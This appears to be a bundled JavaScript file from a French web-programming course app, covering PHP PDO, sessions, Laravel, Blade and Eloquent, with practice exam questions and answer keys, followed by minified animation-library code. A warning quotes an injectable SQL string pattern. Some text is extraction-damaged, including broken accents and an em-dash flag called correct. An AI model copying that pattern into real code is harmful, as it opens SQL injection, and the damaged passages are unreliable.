16   // 2. Requ ê te Pr'epar'ee ( CONTRE LES INJECTIONS SQL )
17   $username = $_POST [ ' user ' ];
18   $email = $_POST [ ' email ' ];
20   // Les param è tres sont repr'esent'es par des marqueurs nomm'es ( ex : : name )
        ou des points d ' interrogation (?)
21   $stmt = $pdo - > prepare ( " INSERT INTO users ( name , email ) VALUES (: name , :
        email ) " ) ;
23   // 3. Ex'ecution avec passage des valeurs
24   $stmt - > execute ([
25        ' name ' = > $username ,
26        ' email ' = > $email
27   ]) ;
29   // 4. R'ecup'erer des donn'ees ( SELECT )
30   $stmt2 = $pdo - > prepare ( " SELECT * FROM users WHERE age > ? " ) ;
31   $stmt2 - > execute ([18]) ;
32   $users = $stmt2 - > fetchAll () ; // R'ecup è re tout
33   // ou $row = $stmt2 - > fetch () pour un seul r'esultat
35   foreach ( $users as $u ) {
36       echo $u [ ' name '] . " <br > " ;
37   }
38   ?>

 ☞   Attention / Piège
 Injection SQL : Mettre directement des variables dans la chaîne SQL (ex: "SELECT * FROM
 users WHERE nom = '$nom'" ) permet à un attaquant d'insérer du code SQL. Solution OBLI-
 GATOIRE : Utiliser les Requêtes Préparées (prepare() et execute()). Elles séparent la
 logique SQL des données fournies.`},{id:"5.5",c:5,t:"Sessions et Cookies",x:`✿   Règle
      Session : session_start() doit être appelé avant tout envoi de HTML au navigateur
       (avant tout echo ou espace blanc). Les données sont côté serveur.
      Cookie : Créé avec setcookie('nom', 'valeur', time() + 3600). Les données sont côté
       client.

  Chapitre    6
Laravel (Framework PHP)`},{id:"6.1",c:6,t:"Concepts fondamentaux",x:`❖   Définition – Laravel
     Laravel est le framework PHP le plus populaire. Il est gratuit, open-source et basé sur l'architecture
     MVC (Modèle-Vue-Contrôleur). Il intègre de nombreux outils d'avant-garde.
     ❖   Définition – Architecture MVC
     Séparation des préoccupations (Separation of concerns ) :
         Modèle (Model) : Gère la logique des données et la communication avec la base de données
          (via Eloquent ORM).
         Vue (View) : Gère l'interface utilisateur (achage HTML). Laravel utilise le moteur de
          template Blade.
         Contrôleur (Controller) : L'intermédiaire. Reçoit la requête de l'utilisateur, interroge les
          modèles, et retourne la vue appropriée avec les données.`},{id:"6.2",c:6,t:"Routing (Routage)",x:`✿   Règle – routes/web.php
     Définit quelles URL correspondent à quelles actions (contrôleurs ou fonctions anonymes).
 1   use App \\ Http \\ Controllers \\ UserController ;
 3   // Route basique
 4   Route :: get ( '/ bienvenue ' , function () {
 5        return view ( ' welcome ') ;
 6   }) ;
 8   // Route appelant une m'ethode de contr ô leur
 9   Route :: get ( '/ users ' , [ UserController :: class , ' index ' ]) ;
11   // Param è tres de route
12   Route :: get ( '/ user /{ id } ' , [ UserController :: class , ' show ' ]) ;
14   // Route nomm'ee ( tr è s utile pour g'en'erer des URL plus tard )
15   Route :: post ( '/ user / store ' , [ UserController :: class , ' store ' ]) -> name ( ' user
        . store ') ;`},{id:"6.3",c:6,t:"Blade (Moteur de Template)",x:`❖   Définition – Blade
     Blade est le moteur de template puissant de Laravel. Fichiers terminant par .blade.php. Il permet
     d'utiliser du code PHP pur, mais offre des directives propres pour plus de clarté.
     ➣   Syntaxe
 1   < ! -- Affichage de variable avec 'echappement HTML auto ( XSS protection )
          -->
 2   Hello {{ $name }} !
 4   < ! -- Affichage sans 'echappement ( DANGEREUX si donn'ees user ) -->
 5   {!! $htmlContent !!}
 7   < ! -- Directives de contr ô le -->
 8   @if ( $age >= 18)
 9         Majeur
10   @else
11         Mineur
12   @endif
14   @foreach ( $users as $user )
15       <li> {{ $user->name }} < / li>
16   @endforeach
18   < ! -- H'eritage de templates ( Layouts ) -->
19   < ! -- Dans main . blade . php ( Layout parent ) -->
20   <html><body>
21         @yield ( ' content ')
22   < / body>< / html>
24   < ! -- Dans child . blade . php -->
25   @extends ( ' main ')
26   @section ( ' content ')
27         <p>Ceci sera inject'e à la place du yield . < / p>
28   @endsection`},{id:"6.4",c:6,t:"Eloquent ORM",x:`❖   Définition – ORM (Object-Relational Mapping)
     Technique permettant de manipuler la base de données avec des objets (classes) plutôt qu'avec
     du code SQL brut. Laravel utilise l'ORM Eloquent. Chaque table a un Modèle associé (ex: table
     users → Modèle User).

     ➣   Syntaxe – Utilisation d'Eloquent
 1   // R'ecup'erer tous les utilisateurs
 2   $users = User :: all () ;
 4   // Trouver par Cl'e Primaire
 5   $user = User :: find (1) ; // Renvoie l ' objet ou null

 6   $user = User :: findOrFail (1) ; // Renvoie l ' objet ou lance une erreur 404
 8   // Requ ê tes avec conditions
 9   $adults = User :: where ( ' age ' , ' >= ' , 18) -> orderBy ( ' name ' , ' asc ') -> get () ;
11   // Insertion
12   $user = new User () ;
13   $user - > name = " Ali " ;
14   $user - > email = " ali@mail . com " ;
15   $user - > save () ;
17   // Update
18   $user = User :: find (1) ;
19   $user - > name = " Nouveau Nom " ;
20   $user - > save () ;
22   // Suppression
23   User :: destroy (1) ;`},{id:"6.5",c:6,t:"Artisan (Ligne de commande)",x:`✿   Règle – Commandes Artisan essentielles
     Artisan est l'interface en ligne de commande de Laravel.
         php artisan serve : Lance un serveur de développement local.
         php artisan make:controller UserController : Crée un contrôleur.
         php artisan make:model Post -m : Crée un modèle ET sa migration associée (-m).
         php artisan migrate : Exécute les migrations en attente (crée/modifie les tables de BDD).
         php artisan route:list : Ache toutes les routes enregistrées.

     ☞   Attention / Piège
     Protection CSRF (Cross-Site Request Forgery) : Laravel gère automatiquement la sécurité
     contre cette faille sur les requêtes POST/PUT/DELETE. Si on oublie d'ajouter la directive @csrf
     dans un formulaire HTML, Laravel renverra une erreur HTTP 419 (Page Expired).
 1   <form method= " POST " action= " / submit " >
 2         @csrf
 3         < ! -- inputs -->
 4   < / form>

 Chapitre    7
Examens Blancs – Programmation Web
70 questions à choix multiples réparties en deux examens. Une seule bonne réponse par question (sauf
indication). Diculté : ★ Facile, ★★ Moyen, ★★★ Dicile.`},{id:"7.1",c:7,t:"Examen Blanc 1 (Général : HTML, CSS, JS, PHP)",x:`✽   Q1 ★
  Quelle méthode HTTP est généralement utilisée pour soumettre un formulaire contenant des
  mots de passe ?
   A) GET
   B) POST
   C) PUT
   D) UPDATE
  ✔ Réponse correcte & Justification
  B) POST. Les données GET sont passées en clair dans l'URL (visibles dans l'historique du
  navigateur), ce qui est une grave faille de sécurité pour des mots de passe. POST envoie les
  données dans le corps de la requête (HTTP Body).
  ✽   Q2 ★
  Quelle est la balise sémantique correcte pour définir un pied de page en HTML5 ?
   A) <bottom>
   B) <section id="footer">
   C) <footer>
   D) <end>
  ✔ Réponse correcte & Justification
  C) <footer>. C'est la balise sémantique standard de HTML5 pour un pied de page (de page
  entière ou d'une section).

                        7.1.–EXAMEN
                              PROGRAMMATION
                                    BLANC 1 (GÉNÉRAL
                                             WEB : HTML, CSS, JS, PHP)
 ✽   Q3 ★
 A quoi sert l'attribut alt sur une balise <img> ?
  A) A acher un texte au survol de la souris.
  B) A fournir un texte alternatif si l'image ne charge pas, et pour les lecteurs d'écran.
  C) A indiquer un lien vers une autre image.
  D) A définir l'alignement de l'image.
 ✔ Réponse correcte & Justification
 B). L'attribut alt est crucial pour l'accessibilité et le SEO. (Pour le texte au survol, on utilise
 l'attribut title).
 ✽   Q4 ★★
 En CSS, quelle propriété Flexbox permet de centrer verticalement les éléments enfants d'une ligne
 (avec flex-direction: row) ?
   A) justify-content: center;
   B) vertical-align: middle;
   C) align-items: center;
   D) align-content: center;
 ✔ Réponse correcte & Justification
 C) align-items: center;. Pour flex-direction: row, l'axe principal est horizontal
 (justify-content), et l'axe secondaire est vertical (align-items).
 ✽   Q5 ★★
 Que signifie box-sizing: border-box; en CSS ?
  A) Ajoute une bordure par défaut à la boîte.
  B) La taille définie (width/height) s'applique uniquement au contenu.
  C) La taille définie inclut le padding et la bordure.
  D) Supprime toutes les marges.
 ✔ Réponse correcte & Justification
 C). C'est une bonne pratique qui rend le calcul des largeurs beaucoup plus intuitif en évitant que
 le padding n'agrandisse la boîte.
 ✽   Q6 ★★★
 Quel est le résultat du calcul de spécificité CSS pour le sélecteur nav#menu ul li.active ?
  A) 0 IDs, 2 classes, 3 balises (0,2,3)
  B) 1 ID, 0 classes, 3 balises (1,0,3)
  C) 1 ID, 1 classe, 3 balises (1,1,3)
  D) 2 IDs, 1 classe, 2 balises (2,1,2)

                        7.1.–EXAMEN
                              PROGRAMMATION
                                    BLANC 1 (GÉNÉRAL
                                             WEB : HTML, CSS, JS, PHP)
 ✔ Réponse correcte & Justification
 C) (1,1,3). #menu = 1 ID (1,0,0). .active = 1 classe (0,1,0). nav, ul, li = 3 balises (0,0,3). Total
 = (1,1,3).
 ✽   Q7 ★
 Dans JavaScript, quel est le résultat de typeof null ?
  A) "null"
  B) "undefined"
  C) "object"
  D) "number"
 ✔ Réponse correcte & Justification
 C) "object". C'est un bug historique bien connu de JavaScript depuis la toute première version,
 conservé pour des raisons de rétrocompatibilité.
 ✽   Q8 ★★
 Quel est l'achage dans la console JS de ce code ? console.log(1 + "2" + "2");
  A) 5
  B) "122"
  C) "32"
  D) NaN
 ✔ Réponse correcte & Justification
 B) "122". Les opérations se font de gauche à droite. 1 + "2" effectue une concaténation (type
 coercion de Number vers String) → "12". Puis "12" + "2" → "122".
 ✽   Q9 ★★
 Quelle méthode de tableau JS modifie (mute) le tableau d'origine ?
  A) map()
  B) filter()
  C) splice()
  D) slice()
 ✔ Réponse correcte & Justification
 C) splice(). splice() supprime ou ajoute des éléments en modifiant directement le tableau.
 map(), filter() et slice() retournent un nouveau tableau et laissent l'original intact.

 ✽   Q10 ★★★
 Que fait event.preventDefault() en JavaScript ?
  A) Arrête le bouillonnement (bubbling) de l'événement.
  B) Empêche le comportement par défaut du navigateur (ex: rechargement de page
       d'un form).

                        7.1.–EXAMEN
                              PROGRAMMATION
                                    BLANC 1 (GÉNÉRAL
                                             WEB : HTML, CSS, JS, PHP)
        C) Supprime l'écouteur d'événement.
        D) Empêche l'exécution d'autres fonctions JS.
    ✔ Réponse correcte & Justification
    B). Pour arrête le bouillonnement (bubbling), on utilise event.stopPropagation().
    ✽   Q11 ★★★
    Que retournera ce code asynchrone ?
1   console . log (1) ;
2   setTimeout (() = > console . log (2) , 0) ;
3   Promise . resolve () . then (() = > console . log (3) ) ;
4   console . log (4) ;

        A) 1, 2, 3, 4
        B) 1, 4, 3, 2
        C) 1, 4, 2, 3
        D) 1, 3, 4, 2
    ✔  Réponse correcte & Justification
    B) 1, 4, 3, 2. 1 et 4 sont synchrones (directement sur la Call Stack). 3 est lié à une Promesse
    (Microtask Queue, prioritaire). 2 est lié à setTimeout (Macrotask Queue / Callback Queue, moins
    prioritaire). La Event Loop vide la Microtask Queue avant de passer à la Callback Queue.
    ✽   Q12 ★
    En PHP, quel symbole précède toujours un nom de variable ?
     A) &
     B) @
     C) $
     D) %
    ✔ Réponse correcte & Justification
    C) $. Les variables PHP se déclarent et s'utilisent systématiquement avec un dollar (ex: $nom).
    ✽   Q13 ★★
    Quelle est la différence entre include et require en PHP ?
     A) include est pour le HTML, require pour le PHP.
     B) En cas d'erreur de fichier introuvable, require arrête l'exécution (Fatal Error),
         include lève juste un Warning et continue.
     C) include vérifie si le fichier a déjà été inclus, require non.
     D) Il n'y a aucune différence.

                        7.1.–EXAMEN
                              PROGRAMMATION
                                    BLANC 1 (GÉNÉRAL
                                             WEB : HTML, CSS, JS,`},{id:"7.2",c:7,t:"Examen Blanc 2 (Frameworks : Laravel et Avancé)",x:`✽   Q18 ★
 L'architecture de Laravel est basée sur le pattern MVC. Que signifie le "M" ?
   A) Middleware
   B) Module
   C) Modèle
   D) Method
 ✔ Réponse correcte & Justification
 C) Modèle (Model-View-Controller). Le modèle représente les données et la logique métier (in-
 teraction avec la base de données).
 ✽   Q19 ★★
 Quel moteur de template Laravel utilise-t-il par défaut ?
  A) Twig
  B) Smarty
  C) Blade
  D) Mustache
 ✔ Réponse correcte & Justification
 C) Blade. C'est le moteur intégré à Laravel. Les fichiers portent l'extension .blade.php. Twig
 est généralement utilisé avec le framework Symfony.
 ✽   Q20 ★★
 Dans Laravel Blade, comment acher une variable $texte avec une protection contre les attaques
 XSS (échappement automatique) ?
  A) <?= $texte ?>
  B) {{ $texte }}
  C) {!! $texte !!}

                    BLANCS
                        EXAMEN
                            – PROGRAMMATION
                               BLANC 2 (FRAMEWORKS
                                             WEB : LARAVEL ET AVANCÉ)
     D) {@ $texte @}
 ✔  Réponse correcte & Justification
 B) {{ $texte }}. Blade appelle automatiquement htmlspecialchars() avec cette syntaxe. La
 syntaxe {!! !!} ache les données brutes sans échappement (utile pour du HTML pur que l'on
 a généré soi-même, mais dangereux si le contenu vient d'un utilisateur).
 ✽   Q21 ★★
 Quel nom donne-t-on à l'ORM (Object-Relational Mapping) intégré dans Laravel ?
  A) Doctrine
  B) Eloquent
  C) ActiveRecord
  D) Hibernate
 ✔ Réponse correcte & Justification
 B) Eloquent. C'est l'ORM de Laravel, basé sur le patron de conception ActiveRecord (chaque
 classe est liée à une table, et chaque instance de classe correspond à une ligne de la table). Doctrine
 est l'ORM de Symfony.
 ✽   Q22 ★★
 Dans Laravel, quelle commande Artisan permet de créer un Modèle Post ET sa migration en
 même temps ?
  A) php artisan make:model Post —migration
  B) php artisan make:model Post -m
  C) php artisan create:model Post -m
  D) A et B sont corrects
 ✔ Réponse correcte & Justification
 D) A et B sont corrects. Le flag -m est simplement le raccourci de —migration. C'est une
 commande extrêmement courante dans le workflow Laravel.
 ✽   Q23 ★★★
 A quoi sert la directive @csrf dans un formulaire Blade ?
  A) A définir la méthode HTTP en POST.
  B) A générer un input caché avec un token sécurisé pour empêcher les attaques
      Cross-Site Request Forgery.
  C) A chiffrer les données du formulaire avant envoi.
  D) A valider les données côté client.
 ✔ Réponse correcte & Justification
 B). Si vous envoyez une requête POST/PUT/DELETE sans ce token, Laravel bloquera la requête
 (Erreur 419 Page Expired) par sécurité.

                    BLANCS
                        EXAMEN
                            – PROGRAMMATION
                               BLANC 2 (FRAMEWORKS
                                             WEB : LARAVEL ET AVANCÉ)
 ✽   Q24 ★★★
 Dans un contrôleur Laravel, comment valider les données entrantes de manière rapide (ex: vérifier
 qu'un champ title est présent et unique dans la table posts) ?
   A) $request->validate(['title' => 'required|unique:posts']);
   B) $request->check('title', 'required');
   C) Il faut faire une requête SQL manuelle avec Eloquent.
   D) En utilisant la fonction native PHP filter_var().
 ✔ Réponse correcte & Justification
 A). Laravel propose un système de validation intégré très puissant. $request->validate() redirige
 automatiquement l'utilisateur vers la page précédente avec les messages d'erreur si la validation
 échoue.
 ✽   Q25 ★★
 En Laravel, qu'est-ce qu'un Middleware ?
  A) Un logiciel de base de données.
  B) La partie Vue du pattern MVC.
  C) Une couche qui inspecte et filtre les requêtes HTTP avant d'atteindre le con-
      trôleur (ex: vérifier l'authentification).
  D) Un outil de migration de données.
 ✔ Réponse correcte & Justification
 C). Par exemple, le middleware auth intercepte la requête : si l'utilisateur n'est pas connecté, le
 middleware le redirige vers la page de login avant même que la route ou le contrôleur ne soit
 exécuté.
 ✽   Q26 ★★★
 Que signifie l'architecture REST pour une API ?
  A) Representational State Transfer (utilise les verbes HTTP standards pour des
      opérations CRUD sur des ressources nommées via URL).
  B) Relational Entity System Transfer (uniquement pour les BDD relationnelles).
  C) Realtime Synchronous Transfer.
  D) Remote Execution System Tool.
 ✔  Réponse correcte & Justification
 A). Dans une API RESTful, l'URL représente la ressource (ex: /users) et le verbe HTTP
 l'action (GET pour lire, POST pour créer, PUT pour maj, DELETE pour supprimer).
 ✽   Q27 ★★
 Qu'est-ce que JSON (JavaScript Object Notation) ?
  A) Un nouveau langage de programmation.
  B) Un format de texte léger pour le stockage et l'échange de données, basé sur la
       syntaxe des objets JavaScript.

                    BLANCS
                        EXAMEN
                            – PROGRAMMATION
                               BLANC 2 (FRAMEWORKS
                                             WEB : LARAVEL ET AVANCÉ)
     C) Une bibliothèque JavaScript pour requêtes HTTP.
     D) Un SGBD NoSQL.
 ✔ Réponse correcte & Justification
 B). JSON a remplacé XML comme format standard pour les échanges de données via les API.
 (Attention : en JSON pur, les clés d'objet doivent obligatoirement être entre doubles guillemets "
 ", contrairement aux objets JS classiques)
 ✽   Q28 ★★
 Quelle fonction PHP native permet de récupérer un JSON sous forme de tableau associatif ?
  A) json_encode($json, true)
  B) json_decode($json, true)
  C) parse_json($json)
  D) JSON::parse($json)
 ✔ Réponse correcte & Justification
 B) json_decode($json, true). Le second paramètre true est essentiel pour obtenir un tableau
 associatif (array) PHP. Sans lui (ou à false), il retourne un Object (stdClass). json_encode()
 fait l'inverse (Array vers JSON).
 ✽   Q29 ★★★
 Comment simuler les verbes PUT ou DELETE depuis un formulaire`},{id:"8.1",c:8,t:"Explications des codes Web",x:`❍   Note HTML – Structure et sémantique
 Chaque balise a un rôle sémantique :
                 , ,             ,            ,
      <header> <nav> <main> <article> <section> <footer>,          : structure du document.
      <form> : collecte de données. method="GET" : visible dans l'URL. method="POST" : corps de
       la requête.
      name : clé envoyée au serveur. id : identifiant unique pour CSS/JS.
      Différence <div> vs <span> : bloc vs en ligne.

 ❍   Note CSS – Cascade et spécificité
 Ordre de priorité (du plus faible au plus fort) :
   1. Styles du navigateur (user-agent)
   2. Sélecteur d'élément (div) : spécificité = 0-0-1
   3. Sélecteur de classe (.classe) : spécificité = 0-1-0
   4. Sélecteur d'ID (#id) : spécificité = 1-0-0
   5. Style inline (style="...") : spécificité = 1-0-0-0
   6. !important : surpasse tout
 Box Model : Taille totale = content + padding + border + margin.
 box-sizing: border-box : padding et border sont inclus dans width/height.

 ❍   Note JavaScript – Concepts clés
      let : portée de bloc, réassignable. const : portée de bloc, non réassignable.
      var : portée de fonction, hoistée. À éviter.
      === : égalité stricte (type + valeur). == : avec conversion de type (à éviter).
      map : transforme chaque élément. filter : conserve selon un test. reduce : accumule.
      async/await : sucre syntaxique sur les Promises.
      fetch() : retourne une Promise. Un statut 404 ne rejette PAS la Promise.

                                         8.2. ETDÉFINITIONS
                                                  NOTIONS ÀWEB
                                                            MÉMORISER
                                                               À MÉMORISER`},{id:"8.2",c:8,t:"Définitions Web à mémoriser",x:`❖   Définition Glossaire Web
  Terme                  Définition
  HTML                   Langage de structure et de sémantique du contenu web.
  CSS                    Langage de présentation (couleurs, tailles, mise en page).
  JavaScript             Langage de comportement (interactivité, DOM, requêtes).
  DOM                    Document Object Model : représentation arborescente du HTML.
  API                    Interface de programmation. REST : architecture pour les API web.
  JSON                   Format d'échange léger basé sur la syntaxe JS. Clés entre " ".
  AJAX                   Requêtes asynchrones sans recharger la page (fetch, XMLHttpRequest).
  MVC                    Modèle-Vue-Contrôleur : séparation des responsabilités.
  Laravel                Framework PHP suivant le pattern MVC. Blade = moteur de templates.
  Composer               Gestionnaire de dépendances PHP (équivalent npm pour Node).
  Session                Données côté serveur, identifiées par un cookie de session.
  Cookie                 Petit fichier côté client, envoyé avec chaque requête HTTP.
  HTTP                   Protocole requête/réponse. GET=lire, POST=créer, PUT=modifier,
                         DELETE=supprimer.
  HTTPS                  HTTP + TLS (chiffrement). Port 443.`},{id:"8.3",c:8,t:"Règles fondamentales à mémoriser",x:`★   Astuce Concours 20 règles d'or Web
    1. HTML = structure, CSS = présentation, JS = comportement.
    2. box-sizing: border-box inclut padding et border dans width/height.
    3. let/const = portée de bloc. var = portée de fonction (à éviter).
    4. === compare type ET valeur. == convertit (ex: "5" == 5 est true).
    5. const interdit la réaffectation, PAS la mutation de l'objet.
    6. Flexbox = 1 dimension (ligne OU colonne). Grid = 2 dimensions (lignes ET colonnes).
    7. position: relative reste dans le flux. absolute sort du flux.
    8. z-index ne fonctionne que sur les éléments positionnés.
    9. GET : données dans l'URL (limité, visible). POST : dans le body (pas de limite).
   10. REST : URL = ressource, verbe HTTP = action.
   11. json_decode($json, true) : retourne un tableau associatif PHP (le true est crucial).
   12. Toujours valider côté serveur (ne jamais faire confiance au navigateur).
   13. PDO avec requêtes préparées pour éviter les injections SQL.
   14. htmlspecialchars() pour éviter les XSS dans les sorties HTML.
   15. MVC Laravel : routes → contrôleur → modèle → vue Blade.
   16. @csrf dans les formulaires Laravel (protection CSRF).
   17. @method('PUT') pour simuler PUT/DELETE dans les formulaires HTML.
   18. Responsive : @media queries + unités relatives (%, vw, rem).

                                       8.4. PIÈGES
                                             ET NOTIONS
                                                   FRÉQUENTS
                                                        À MÉMORISER
                                                             AU CONCOURS
  19. localStorage persiste. sessionStorage disparaît à la fermeture.
  20. Les Promises ont 3 états : pending, fulfilled, rejected.`},{id:"8.4",c:8,t:"Pièges fréquents au concours",x:`☞   Attention / Piège 10 pièges classiques Web
   1. == au lieu de === en JS : null == undefined est true !
   2. var est hoisté mais initialisé à undefined. let/const ne sont pas accessibles avant décla-
      ration.
   3. this en JS dépend du contexte d'appel, pas de la déclaration.
   4. fetch() ne rejette PAS pour un 404/500. Vérifier response.ok.
   5. Un formulaire HTML ne supporte que GET et POST (pas PUT/DELETE).
   6. CSS : margin: auto ne centre que les éléments block avec largeur définie.
   7. float retire l'élément du flux normal (utiliser flexbox/grid à la place).
   8. PHP : $_GET et $_POST ne sont PAS sécurisés. Toujours filtrer/valider.
   9. innerHTML peut exécuter du script (risque XSS). Préférer textContent.
  10. JSON : les clés DOIVENT être entre guillemets doubles. Pas de virgule finale.`}],Th=[],J2={id:Ch,name:Ah,color:Eh,sections:Ph,quiz:Th},Y2=Object.freeze(Object.defineProperty({__proto__:null,color:Eh,default:J2,id:Ch,name:Ah,quiz:Th,sections:Ph},Symbol.toStringTag,{value:"Module"})),su=R.createContext({});function au(e){const n=R.useRef(null);return n.current===null&&(n.current=e()),n.current}const Z2=typeof window<"u",zi=Z2?R.useLayoutEffect:R.useEffect,Ws=R.createContext(null);function ou(e,n){e.indexOf(n)===-1&&e.push(n)}function bs(e,n){const t=e.indexOf(n);t>-1&&e.splice(t,1)}const Ze=(e,n,t)=>t>n?n:t<e?e:t;let $s=()=>{};const Sn={},lu=e=>/^-?(?:\d+(?:\.\d+)?|\.\d+)$/u.test(e),Lh=e=>typeof e=="object"&&e!==null,uu=e=>/^0[^.\s]+$/u.test(e);function Rh(e){let n;return()=>(n===void 0&&(n=e()),n)}const Je=e=>e,tr=(...e)=>e.reduce((n,t)=>i=>t(n(i))),Gi=(e,n,t)=>{const i=n-e;return i?(t-e)/i:1};class Cs{constructor(){this.subscriptions=[]}add(n){return ou(this.subscriptions,n),()=>this.remove(n)}remove(n){bs(this.subscriptions,n)}notify(n,t,i){const r=this.subscriptions.length;if(r)if(r===1)this.subscriptions[0](n,t,i);else for(let s=0;s<r;s++){const a=this.subscriptions[s];a&&a(n,t,i)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}}const je=e=>e*1e3,Fe=e=>e/1e3,Dh=(e,n)=>n?e*(1e3/n):0,qh=(e,n,t)=>(((1-3*t+3*n)*e+(3*t-6*n))*e+3*n)*e,ey=1e-7,ny=12;function ty(e,n,t,i,r){let s,a,o=0;do a=n+(t-n)/2,s=qh(a,i,r)-e,s>0?t=a:n=a;while(Math.abs(s)>ey&&++o<ny);return a}function ir(e,n,t,i){if(e===n&&t===i)return Je;const r=s=>ty(s,0,1,e,t);return s=>s===0||s===1?s:qh(r(s),n,i)}const Nh=e=>n=>n<=.5?e(2*n)/2:(2-e(2*(1-n)))/2,Ih=e=>n=>1-e(1-n),Mh=ir(.33,1.53,.69,.99),cu=Ih(Mh),Oh=Nh(cu),wh=e=>e>=1?1:(e*=2)<1?.5*cu(e):.5*(2-Math.pow(2,-10*(e-1))),du=e=>1-Math.sin(Math.acos(e)),Bh=Ih(du),Fh=Nh(du),iy=ir(.42,0,1,1),ry=ir(0,0,.58,1),pu=ir(.42,0,.58,1),sy=e=>Array.isArray(e)&&typeof e[0]!="number",kh=e=>Array.isArray(e)&&typeof e[0]=="number",ay={linear:Je,easeIn:iy,easeInOut:pu,easeOut:ry,circIn:du,circInOut:Fh,circOut:Bh,backIn:cu,backInOut:Oh,backOut:Mh,anticipate:wh},oy=e=>typeof e=="string",Xc=e=>{if(kh(e)){$s(e.length===4);const[n,t,i,r]=e;return ir(n,t,i,r)}else if(oy(e))return ay[e];return e},Lr=["setup","read","resolveKeyframes","preUpdate","update","preRender","render","postRender"];function ly(e){let n=new Set,t=new Set,i=!1,r=!1;const s=new Set;let a={delta:0,timestamp:0,isProcessing:!1};function o(u){s.has(u)&&(t.add(u),e()),u(a)}const l={schedule:(u,c=!1,d=!1)=>{const g=d&&i?n:t;return c&&s.add(u),g.add(u),u},cancel:u=>{t.delete(u),s.delete(u)},process:u=>{if(a=u,i){r=!0;return}i=!0;const c=n;n=t,t=c,n.forEach(o),n.clear(),i=!1,r&&(r=!1,l.process(u))}};return l}const uy=40;function jh(e,n){let t=!1,i=!0;const r={delta:0,timestamp:0,isProcessing:!1},s=()=>t=!0,a=Lr.reduce((f,y)=>(f[y]=ly(s),f),{}),{setup:o,read:l,resolveKeyframes:u,preUpdate:c,update:d,preRender:p,render:g,postRender:v}=a,x=()=>{const f=Sn.useManualTiming,y=f?r.timestamp:performance.now();t=!1,f||(r.delta=i?1e3/60:Math.max(Math.min(y-r.timestamp,uy),1)),r.timestamp=y,r.isProcessing=!0,o.process(r),l.process(r),u.process(r),c.process(r),d.process(r),p.process(r),g.process(r),v.process(r),r.isProcessing=!1,t&&n&&(i=!1,e(x))},b=()=>{t=!0,i=!0,r.isProcessing||e(x)};return{schedule:Lr.reduce((f,y)=>{const A=a[y];return f[y]=(T,S=!1,C=!1)=>(t||b(),A.schedule(T,S,C)),f},{}),cancel:f=>{for(let y=0;y<Lr.length;y++)a[Lr[y]].cancel(f)},state:r,steps:a}}const{schedule:U,cancel:Vn,state:ie,steps:Ra}=jh(typeof requestAnimationFrame<"u"?requestAnimationFrame:Je,!0);let Hr;function cy(){Hr=void 0}const le={now:()=>(Hr===void 0&&le.set(ie.isProcessing||Sn.useManualTiming?ie.timestamp:performance.now()),Hr),set:e=>{Hr=e,queueMicrotask(cy)}},jt=e=>Math.round(e*1e5)/1e5,Uh=e=>n=>typeof n=="string"&&n.startsWith(e),Vh=Uh("--"),dy=Uh("var(--"),mu=e=>dy(e)?py.test(e.split("/*")[0].trim()):!1,py=/var\(--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)$/iu;function Qc(e){return typeof e!="string"?!1:e.split("/*")[0].includes("var(--")}const Jt={test:e=>typeof e=="number",parse:parseFloat,transform:e=>e},Xi={...Jt,transform:e=>Ze(0,1,e)},Rr={...Jt,default:1},fu=/-?(?:\d+(?:\.\d+)?|\.\d+)/gu;function my(e){return e==null}const fy=/^(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))$/iu,hu=(e,n)=>t=>!!(typeof t=="string"&&fy.test(t)&&t.startsWith(e)||n&&!my(t)&&Object.prototype.hasOwnProperty.call(t,n)),_h=(e,n,t)=>i=>{if(typeof i!="string")return i;const[r,s,a,o]=i.match(fu);return{[e]:parseFloat(r),[n]:parseFloat(s),[t]:parseFloat(a),alpha:o!==void 0?parseFloat(o):1}},hy=e=>Ze(0,255,e),Da={...Jt,transform:e=>Math.round(hy(e))},nt={test:hu("rgb","red"),parse:_h("red","green","blue"),transform:({red:e,green:n,blue:t,alpha:i=1})=>"rgba("+Da.transform(e)+", "+Da.transform(n)+", "+Da.transform(t)+", "+jt(Xi.transform(i))+")"};function gy(e){let n="",t="",i="",r="";return e.length>5?(n=e.substring(1,3),t=e.substring(3,5),i=e.substring(5,7),r=e.substring(7,9)):(n=e.substring(1,2),t=e.substring(2,3),i=e.substring(3,4),r=e.substring(4,5),n+=n,t+=t,i+=i,r+=r),{red:parseInt(n,16),green:parseInt(t,16),blue:parseInt(i,16),alpha:r?parseInt(r,16)/255:1}}const ko={test:hu("#"),parse:gy,transform:nt.transform},rr=e=>({test:n=>typeof n=="string"&&n.endsWith(e)&&n.split(" ").length===1,parse:parseFloat,transform:n=>`${n}${e}`}),un=rr("deg"),ln=rr("%"),N=rr("px"),vy=rr("vh"),yy=rr("vw"),Wc={...ln,parse:e=>ln.parse(e)/100,transform:e=>ln.transform(e*100)},qt={test:hu("hsl","hue"),parse:_h("hue","saturation","lightness"),transform:({hue:e,saturation:n,lightness:t,alpha:i=1})=>"hsla("+Math.round(e)+", "+ln.transform(jt(n))+", "+ln.transform(jt(t))+", "+jt(Xi.transform(i))+")"},ee={test:e=>nt.test(e)||ko.test(e)||qt.test(e),parse:e=>nt.test(e)?nt.parse(e):qt.test(e)?qt.parse(e):ko.parse(e),transform:e=>typeof e=="string"?e:e.hasOwnProperty("red")?nt.transform(e):qt.transform(e),getAnimatableNone:e=>{const n=ee.parse(e);return n.alpha=0,ee.transform(n)}},xy=/(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))/giu,Hh=new RegExp(fu.source),zh=new RegExp(xy.source,"i");function Sy(e){return isNaN(e)&&typeof e=="string"&&(Hh.test(e)||zh.test(e))}const 